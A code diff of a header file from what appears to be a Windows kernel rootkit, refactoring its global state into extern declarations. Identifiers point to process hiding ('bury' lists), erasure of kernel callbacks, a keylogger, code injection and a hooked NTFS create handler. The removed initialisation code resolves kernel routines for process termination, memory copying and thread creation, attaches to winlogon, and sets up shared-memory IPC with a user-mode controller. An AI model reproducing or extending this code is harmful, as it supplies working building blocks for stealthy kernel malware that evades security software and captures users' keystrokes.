@@ -1,9 +1,12 @@
 #pragma once
 
 #include <ntifs.h>
+#include <ntddk.h>
 #include <wdf.h>
 #include "WinTypes.hpp"
 #include "Vector.hpp"
+#include "AutoLock.hpp"
+#include "Debug.hpp"
 
 //
 // Function Prototypes
@@ -26,51 +29,6 @@ typedef NTSTATUS(*ZWUNMAPVIEWOFSECTION)(IN HANDLE ProcessHandle, IN PVOID BaseAd
 typedef NTSTATUS(*ZWALLOCATEVIRTUALMEMORY)(IN HANDLE ProcessHandle, OUT PVOID BaseAddress, IN ULONG_PTR ZeroBits, OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG PageProtection);
 typedef NTSTATUS(*ZWCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, SIZE_T CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
 
-namespace BeGlobals
-{
-    PVOID NtOsKrnlAddr;
-    PVOID Win32kBaseAddr;
-    PDRIVER_OBJECT diskDriverObject;
-
-    OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;
-    ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation;
-    ZWTERMINATEPROCESS pZwTerminateProcess;
-    ZWOPENPROCESS pZwOpenProcess;
-    ZWCLOSE pZwClose;
-    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
-    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
-    PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;
-    ZWMAPVIEWOFSECTION pZwMapViewOfSection;
-    ZWCREATESECTION pZwCreateSection;
-    ZWUNMAPVIEWOFSECTION pZwUnmapViewOfSection;
-    ZWALLOCATEVIRTUALMEMORY pZwAllocateVirtualMemory;
-    ZWCREATETHREADEX pZwCreateThreadEx;
-    ZWCREATEEVENT pZwCreateEvent;
-    ZWSETEVENT pZwSetEvent;
-    ZWRESETEVENT pZwResetEvent;
-
-    HANDLE winLogonPid;
-    PEPROCESS winLogonProc;
-}
-
-#include "Misc.hpp"
-
-namespace BeGlobals
-{
-    //
-    // For communication with the userland process
-    //
-    HANDLE hSharedMemory = NULL;
-    PVOID  pSharedMemory = NULL;
-    HANDLE commandEvent  = NULL;
-    HANDLE answerEvent   = NULL;
-}
-
-#include "Injection.hpp"
-#include "MemoryUtils.hpp"
-#include "AddressUtils.hpp"
-#include "AutoLock.hpp"
-
 #define MAX_BURIED_PROCESSES 256
 #define MAX_ERASE_CALLBACKS 256
 
@@ -88,146 +46,52 @@ typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
 
 typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
-namespace BeGlobals
-{
-    WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
-    KERNEL_CALLBACK_RESTORE_INFO_ARRAY BeCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };
+#pragma once
 
-    //
-    // Mutexes
-    //
-    FastMutex ProcessListLock = FastMutex();
-    FastMutex CallbackLock = FastMutex();
+namespace BeGlobals {
+    extern PVOID NtOsKrnlAddr;
+    extern PVOID Win32kBaseAddr;
+    extern PDRIVER_OBJECT diskDriverObject;
 
-    NTFS_IRP_MJ_CREATE_FUNCTION OriginalNTFS_IRP_MJ_CREATE_function = NULL;
+    extern OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;
+    extern ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation;
+    extern ZWTERMINATEPROCESS pZwTerminateProcess;
+    extern ZWOPENPROCESS pZwOpenProcess;
+    extern ZWCLOSE pZwClose;
+    extern ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
+    extern MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
+    extern PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;
+    extern ZWMAPVIEWOFSECTION pZwMapViewOfSection;
+    extern ZWCREATESECTION pZwCreateSection;
+    extern ZWUNMAPVIEWOFSECTION pZwUnmapViewOfSection;
+    extern ZWALLOCATEVIRTUALMEMORY pZwAllocateVirtualMemory;
+    extern ZWCREATETHREADEX pZwCreateThreadEx;
+    extern ZWCREATEEVENT pZwCreateEvent;
+    extern ZWSETEVENT pZwSetEvent;
+    extern ZWRESETEVENT pZwResetEvent;
 
-    bool bShutdown = false;
-    bool bLogKeys  = false;
+    extern HANDLE winLogonPid;
+    extern PEPROCESS winLogonProc;
 
-    KEVENT hKeyLoggerTerminationEvent;
-    KEVENT hMainLoopTerminationEvent;
+    extern HANDLE hSharedMemory;
+    extern PVOID pSharedMemory;
+    extern HANDLE commandEvent;
+    extern HANDLE answerEvent;
 
-    NTSTATUS
-    BeInitGlobals()
-    {
-        //
-        // Get base address of modules
-        //
-        UNICODE_STRING Ntoskrnl   = RTL_CONSTANT_STRING(L"ntoskrnl.exe");
-        UNICODE_STRING Win32kbase = RTL_CONSTANT_STRING(L"win32kbase.sys");
-        NtOsKrnlAddr              = BeGetBaseAddrOfModule(&Ntoskrnl);
-        Win32kBaseAddr            = BeGetBaseAddrOfModule(&Win32kbase);
+    extern WCHAR_ARRAY beBuryTargetProcesses;
+    extern KERNEL_CALLBACK_RESTORE_INFO_ARRAY BeCallbacksToRestore;
 
-        LOG_MSG("ntoskrnl.exe base addr: 0x%llx\n", (UINT64)NtOsKrnlAddr);
-        LOG_MSG("Win32kbase.sys base addr: 0x%llx\n", (UINT64)Win32kBaseAddr);
+    extern FastMutex ProcessListLock;
+    extern FastMutex CallbackLock;
 
-        //
-        // Since we are using a mapped driver, we should not try to access the header of our driver
-        // instead we use the DISK driver as an object any time we need to access the header
-        //
-        pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)BeGetSystemRoutineAddress("ntoskrnl.exe", "ObReferenceObjectByName");
-        if (!pObReferenceObjectByName)
-        {
-            LOG_MSG("Failed to resolve ObReferenceObjectByName\n");
-            return STATUS_NOT_FOUND;
-        }
+    extern NTFS_IRP_MJ_CREATE_FUNCTION OriginalNTFS_IRP_MJ_CREATE_function;
 
-        UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"\\Driver\\disk");
-        NTSTATUS status = BeGlobals::pObReferenceObjectByName(
-            &DriverName,
-            OBJ_CASE_INSENSITIVE,
-            NULL,
-            0,
-            *IoDriverObjectType,
-            KernelMode,
-            NULL,
-            (PVOID*)&BeGlobals::diskDriverObject
-        );
+    extern bool bShutdown;
+    extern bool bLogKeys;
 
-        if (!NT_SUCCESS(status))
-        {
-            LOG_MSG("Failure on ObReferenceObjectByName\n");
-            return status;
-        }
+    extern KEVENT hKeyLoggerTerminationEvent;
+    extern KEVENT hMainLoopTerminationEvent;
 
-        //
-        // Init locks
-        //
-        ProcessListLock.Init();
-        CallbackLock.Init();
-
-        //
-        // Function resolving
-        //
-        pZwTerminateProcess                = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwTerminateProcess");
-        pZwOpenProcess                     = (ZWOPENPROCESS)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwOpenProcess");
-        pZwClose                           = (ZWCLOSE)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwClose");
-        pZwProtectVirtualMemory            = (ZWPROTECTVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwProtectVirtualMemory");
-        pZwAllocateVirtualMemory           = (ZWALLOCATEVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwAllocateVirtualMemory");
-        pZwCreateSection                   = (ZWCREATESECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwCreateSection");
-        pZwMapViewOfSection                = (ZWMAPVIEWOFSECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwMapViewOfSection");
-        pMmCopyVirtualMemory               = (MMCOPYVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "MmCopyVirtualMemory");
-        pZwQuerySystemInformation          = (ZWQUERYSYSTEMINFORMATION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwQuerySystemInformation");
-        pPsSetCreateProcessNotifyRoutineEx = (PSSETCREATEPROCESSNOTIFYROUTINEEX)BeGetSystemRoutineAddress("ntoskrnl.exe", "PsSetCreateProcessNotifyRoutineEx");
-        pZwUnmapViewOfSection              = (ZWUNMAPVIEWOFSECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwUnmapViewOfSection");
-        pZwCreateThreadEx                  = (ZWCREATETHREADEX)FindZwFunction("NtCreateThreadEx");
-        pZwResetEvent                      = (ZWRESETEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwResetEvent");
-        pZwCreateEvent                     = (ZWCREATEEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwCreateEvent");
-        pZwSetEvent                        = (ZWSETEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwSetEvent");
-
-        if (!(pZwTerminateProcess &&
-            pZwOpenProcess &&
-            pZwClose &&
-            pZwCreateSection &&
-            pZwMapViewOfSection &&
-            pZwProtectVirtualMemory &&
-            pMmCopyVirtualMemory &&
-            pZwQuerySystemInformation &&
-            pPsSetCreateProcessNotifyRoutineEx &&
-            pZwAllocateVirtualMemory &&
-            pZwUnmapViewOfSection))
-        {
-            LOG_MSG("Failed to resolve one or more functions\n");
-            return STATUS_NOT_FOUND;
-        }
-
-        LOG_MSG("Resolved functions\n");
-
-        //
-        // Get winlogon PID to enable attaching to session space
-        //
-        UNICODE_STRING ProcessName = { 0 };
-        RtlInitUnicodeString(&ProcessName, L"winlogon.exe");
-        winLogonPid = BeGetPidFromProcessName(ProcessName);
-
-        LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(winLogonPid));
-
-        if (PsLookupProcessByProcessId(winLogonPid, &winLogonProc))
-        {
-            return STATUS_NOT_FOUND;
-        }
-
-        //
-        // Setup shared memory for interprocess communications
-        //
-        UNICODE_STRING commandEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeCommandEvt");
-        UNICODE_STRING answerEventName  = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeAnswerEvt");
-        
-        BeCreateNamedEvent(&commandEvent, &commandEventName, FALSE);
-        BeCreateNamedEvent(&answerEvent, &answerEventName, FALSE);
-        
-        LOG_MSG("Created events\n");
-
-        //
-        // Setup shared memory for IPC
-        //
-        BeCreateSharedMemory();
-        LOG_MSG("Created shared memory\n");
-
-        KeInitializeEvent(&BeGlobals::hKeyLoggerTerminationEvent, NotificationEvent, FALSE);
-        KeInitializeEvent(&BeGlobals::hMainLoopTerminationEvent, NotificationEvent, FALSE);
-        LOG_MSG("Initialised termination events\n");
-
-        return STATUS_SUCCESS;
-    };
+    NTSTATUS BeInitGlobals();
 }
+
